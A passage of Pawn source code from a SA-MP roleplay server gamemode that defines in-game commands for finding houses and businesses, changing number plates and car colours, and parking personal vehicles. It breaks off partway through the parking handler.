		format(string,sizeof(string),"Vehicle 15: Model:[%s] Locked:[%s] KM:[%.0f] TD:[%d] Insurance:[%d] InsuranceP:[%d] Value:[%s]",CarInfo[carid][cDescription],locked,CarInfo[carid][cKM],CarInfo[carid][cTimed],CarInfo[carid][cInsurancecar],CarInfo[carid][cInscarprice],FormatNumber(CarInfo[carid][cValue]));
		SCM(playerid,COLOR_GRAD1,string);
	}
	SCM(playerid,COLOR_TUTORIAL,"__________________________");
	return 1;
}
CMD:cars(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_vehicles(playerid, params);
}
CMD:findhouse(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    new houseID;
		if(sscanf(params, "d", houseID)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/findhouse <House ID>");
  		new i = sizeof(HouseInfo) - 1;
		if(houseID > i || houseID < 0) return SendClientMessage(playerid, COLOR_GREY, "Invalid House ID.");
		if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
        if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1 && JCurier[playerid][0] < 1)
		{
			SetPlayerCheckpoint(playerid, HouseInfo[houseID][hEntrancex], HouseInfo[houseID][hEntrancey], HouseInfo[houseID][hEntrancez], 4.0);
			CP[playerid] = 43;
			SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow!.");
        }
        else
        {
            ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "No");
		}
	}
	return 1;
}
CMD:findbiz(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{

		new houseID;
		if(sscanf(params, "d", houseID)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/findbiz <Business ID>");
	    new i = sizeof(BizzInfo) - 1;
		if(houseID > i || houseID < 0) return SendClientMessage(playerid, COLOR_GREY, "Invalid bizz ID.");
		if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
        if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1)
		{
			SetPlayerCheckpoint(playerid, BizzInfo[houseID][bEntranceX], BizzInfo[houseID][bEntranceY], BizzInfo[houseID][bEntranceZ], 4.0);
			CP[playerid] = 43;
			SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow!.");
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
		}
	}
	return 1;
}
CMD:carplate(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
	&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0 && 
	PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
	&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You do not have a vehicle.");
	if(GetPlayerCash(playerid) >= 25000)
 	{
 	    for(new v=0; v<=MAX_PVEHS; v++)
 	    {
            if(v == 15) { break; }
			if(GetPlayerVehicleID(playerid) == personalcar[v][playerid])
			{
				if(IsPlayerInVehicle(playerid, personalcar[v][playerid]))
	 			{
	   				ShowPlayerDialog(playerid, DIALOG_PLATE, DIALOG_STYLE_INPUT, "Number Plate", "Enter new number plate:", "Change", "Cancel");
				}
			}
		}
	}
	else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have the cash for that.");
	return 1;
}
CMD:acarcolor(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new colorpart,colorid;
	if(IsAnOwnableCar(GetPlayerVehicleID(playerid)))
	{
		new car = GetPlayerVehicleID(playerid);
		if(sscanf(params, "ii", colorpart, colorid)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/carcolor <1 or 2> <color id(0-255)>");
		if(colorpart==1)
		{
			if(colorid < 0 || colorid > 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Invalid color ID.");
         	CarInfo[OwnedVeh(car)][cColorOne] = colorid;
       		ChangeVehicleColor(car, colorid, CarInfo[OwnedVeh(car)][cColorTwo]);
			vUpdate(OwnedVeh(car), cColorOnex);
			return 1;
		}
		if(colorpart==2)
		{
			if(colorid < 0 || colorid > 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Invalid color ID.");
         	CarInfo[OwnedVeh(car)][cColorTwo] = colorid;
       		ChangeVehicleColor(car, CarInfo[OwnedVeh(car)][cColorOne], colorid);
			vUpdate(OwnedVeh(car), cColorTwox);
			return 1;
		}
	}
	else return SCM(playerid,COLOR_SERVER,"{FFB870}You are not in your vehicle.");
	return 1;
}
CMD:carcolor(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
	&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0
	&& PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
	&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You do not have a vehicle.");
	if(GetPlayerCash(playerid) < 5000) return SendClientMessage(playerid, COLOR_GREY,"{FFB870}You don't have enough money for vehicle respray.");
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY,"{FFB870}You are not in a vehicle.");
	new colorpart,colorid,VehI = GetPlayerVehicleID(playerid);
    if(IsPlayerConnected(playerid))
    {
		if(VehI == personalcar[0][playerid] || VehI == personalcar[1][playerid] || VehI == personalcar[2][playerid] || VehI == personalcar[3][playerid] || VehI == personalcar[4][playerid] || VehI == personalcar[5][playerid]
	 	|| VehI == personalcar[6][playerid] || VehI == personalcar[7][playerid] || VehI == personalcar[8][playerid] || VehI == personalcar[9][playerid] || VehI == personalcar[10][playerid]
		|| VehI == personalcar[11][playerid] || VehI == personalcar[12][playerid] || VehI == personalcar[13][playerid] || VehI == personalcar[14][playerid])
		{
			new car = GetPlayerVehicleID(playerid);
			if(sscanf(params, "ii", colorpart, colorid)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/carcolor <1 or 2> <color id(0-255)>");
			if(colorpart==1)
			{
				if(PlayerInfo[playerid][pHiddenColor] <= 0 && colorid > 127) return SendClientMessage(playerid, COLOR_SERVER, "Nu ai suficiente culori hidden. Foloseste comanda [/shop] pentru a achizitiona hidden colors.");
				if(colorid < 0 || colorid > 255) return SendClientMessage(playerid, COLOR_SERVER, "ID-ul culorilor este cuprins intre 0 si 255.");
 				CarInfo[OwnedVeh(car)][cColorOne] = colorid;
  				GivePlayerCash(playerid, -5000);
  				if(colorid > 127)
  				{
   					PlayerInfo[playerid][pHiddenColor] -= 1;
   					Update(playerid, pHiddenColorx);
				}
   				ChangeVehicleColor(car, colorid, CarInfo[OwnedVeh(car)][cColorTwo]);
				Update(playerid, pCashx);
				vUpdate(OwnedVeh(car), cColorOnex);
  				SendClientMessage(playerid,COLOR_SERVER, "Vehicle color changed!");
  				GameTextForPlayer(playerid, "~r~-$5.000", 5000, 1);
				return 1;
			}
			if(colorpart==2)
			{
				if(PlayerInfo[playerid][pHiddenColor] <= 0 && colorid > 127) return SendClientMessage(playerid, COLOR_SERVER, "There are not enough colors hidden. Use the command [/shop] to purchase hidden colors");
				if(colorid < 0 || colorid > 255) return SendClientMessage(playerid, COLOR_SERVER, "ID color is between 0 si 255.");
 				CarInfo[OwnedVeh(car)][cColorTwo] = colorid;
  				GivePlayerCash(playerid, -5000);
  				if(colorid > 127)
  				{
   					PlayerInfo[playerid][pHiddenColor] -= 1;
   					Update(playerid, pHiddenColorx);
				}
   				ChangeVehicleColor(car, CarInfo[OwnedVeh(car)][cColorOne], colorid);
				Update(playerid, pCashx);
				vUpdate(OwnedVeh(car), cColorTwox);
				SendClientMessage(playerid,COLOR_SERVER, "Vehicle color changed!");
				GameTextForPlayer(playerid, "~r~-$5.000", 5000, 1);
				return 1;
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "This is not your car.");
	}
	return 1;
}
CMD:swapcolors(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
		&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0
		&& PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
		&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You do not have a vehicle.");
		if(GetPlayerCash(playerid) < 5000) return SendClientMessage(playerid, COLOR_GREY,"You don't have enough money for vehicle respray.");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY,"You are not in a vehicle.");
		new VehI = GetPlayerVehicleID(playerid);
		if(VehI == personalcar[0][playerid] || VehI == personalcar[1][playerid] || VehI == personalcar[2][playerid] || VehI == personalcar[3][playerid] || VehI == personalcar[4][playerid] || VehI == personalcar[5][playerid]
	 	|| VehI == personalcar[6][playerid] || VehI == personalcar[7][playerid] || VehI == personalcar[8][playerid] || VehI == personalcar[9][playerid] || VehI == personalcar[10][playerid]
		|| VehI == personalcar[11][playerid] || VehI == personalcar[12][playerid] || VehI == personalcar[13][playerid] || VehI == personalcar[14][playerid])
		{
			new color1 = CarInfo[OwnedVeh(VehI)][cColorOne], color2 = CarInfo[OwnedVeh(VehI)][cColorTwo];
			CarInfo[OwnedVeh(VehI)][cColorOne] = color2;
			CarInfo[OwnedVeh(VehI)][cColorTwo] = color1;
			ChangeVehicleColor(VehI, CarInfo[OwnedVeh(VehI)][cColorOne], CarInfo[OwnedVeh(VehI)][cColorTwo]);
			GivePlayerCash(playerid, -5000);
			Update(playerid, pCashx);
			vUpdate(OwnedVeh(VehI), cColorOnex);
			vUpdate(OwnedVeh(VehI), cColorTwox);
			SendClientMessage(playerid,COLOR_SERVER, "Car colors were changed!");
			GameTextForPlayer(playerid, "~r~-$5.000", 5000, 1);
		}
	}
	return 1;
}
CMD:park(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerInRangeOfPoint(playerid, 100.0, 369.4478,-2032.3842,7.6719)) return SCM(playerid, COLOR_ERROR, "You can park your car in this area!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in your vehicle.");
	new engine,lights,alarm,doors,bonnet,boot,objective;
	new Float:x,Float:y,Float:z,Float:a,getcarid;
	getcarid = GetPlayerVehicleID(playerid);
	new interiorr = GetPlayerInterior(playerid),
	virtuall = GetPlayerVirtualWorld(playerid);
	GetVehiclePos(getcarid, x, y, z);
	GetVehicleZAngle(getcarid, a);
	if(IsPlayerConnected(playerid))
	{
		if(getcarid == personalcar[0][playerid] || getcarid == personalcar[1][playerid] || getcarid == personalcar[2][playerid] || getcarid == personalcar[3][playerid] || getcarid == personalcar[4][playerid] || getcarid == personalcar[5][playerid]
	 	|| getcarid == personalcar[6][playerid] || getcarid == personalcar[7][playerid] || getcarid == personalcar[8][playerid] || getcarid == personalcar[9][playerid] || getcarid == personalcar[10][playerid] || getcarid == personalcar[11][playerid]
		|| getcarid == personalcar[12][playerid] || getcarid == personalcar[13][playerid] || getcarid == personalcar[14][playerid])
		{
			new Float:health2;
			GetVehicleHealth(getcarid, health2);
			if(health2 < 500.0 || (vehEngine[getcarid] == 1 && !IsABike(getcarid))) return SCM(playerid,COLOR_GREY,"You need to stop the engine first. Also, your car needs to be reapaired first (more than 500 car health).");
			CarInfo[OwnedVeh(getcarid)][cLocationx] = x;
			CarInfo[OwnedVeh(getcarid)][cLocationy] = y;
			CarInfo[OwnedVeh(getcarid)][cLocationz] = z;
			CarInfo[OwnedVeh(getcarid)][cAngle] = a;
			if(getcarid == personalcar[0][playerid])
			{
				DestroyVehicle(personalcar[0][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[0][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pPcarkeyx);
				return 1;
			}
			else if(getcarid == personalcar[1][playerid])
			{
				DestroyVehicle(personalcar[1][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[1][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pmotokeyx);
				return 1;
			}
			else if(getcarid == personalcar[2][playerid])
			{
				DestroyVehicle(personalcar[2][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[2][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pprcarkeyx);
				return 1;
			}
			else if(getcarid == personalcar[3][playerid])
			{
				DestroyVehicle(personalcar[3][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[3][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pprcarkey2x);
				return 1;
			}
			else if(getcarid == personalcar[4][playerid])
			{
				DestroyVehicle(personalcar[4][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[4][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pPPluscarkeyx);
				return 1;
			}
			else if(getcarid == personalcar[5][playerid])
			{
				DestroyVehicle(personalcar[5][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[5][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pPPluscarkey2x);
				return 1;
			}
			else if(getcarid == personalcar[6][playerid])
			{
				DestroyVehicle(personalcar[6][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[6][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey7x);
				return 1;
			}
			else if(getcarid == personalcar[7][playerid])
			{
				DestroyVehicle(personalcar[7][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[7][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey8x);
				return 1;
			}
			else if(getcarid == personalcar[8][playerid])
			{
				DestroyVehicle(personalcar[8][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[8][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey9x);
				return 1;
			}
			else if(getcarid == personalcar[9][playerid])
			{
				DestroyVehicle(personalcar[9][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[9][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey10x);
				return 1;
			}
			else if(getcarid == personalcar[10][playerid])
			{
